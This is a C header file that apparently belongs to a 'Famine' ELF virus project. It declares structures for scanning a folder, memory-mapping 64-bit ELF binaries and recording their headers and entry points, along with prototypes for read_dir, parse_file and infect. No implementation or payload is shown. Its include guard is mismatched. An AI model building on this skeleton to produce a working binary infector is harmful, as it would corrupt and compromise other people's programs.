#ifndef FAMINE_H
#define FAMINE_Ho

#include <time.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <elf.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <dirent.h>
#include <errno.h>


typedef struct s_arg_data
{
    char *folder;
    int maxThreads;
    bool debug;
} t_arg_data;

typedef struct s_inject
{
	Elf64_Ehdr *header;
    Elf64_Addr *entry_point;

} t_inject;

typedef struct s_file
{
    char fd;
    off_t size_mmap;
    char *file_data;
    char *file_name;
    char *complet_file_name;
    t_inject inject;
} t_file;

/* read_dir.c */
void read_dir(t_arg_data *data, char *path);

/* parse_file.c */
bool parse_file(char *path, char *file_name, t_file *file, t_arg_data *data);

/* infect.c */
void infect(t_file *file, t_arg_data *data);

#endif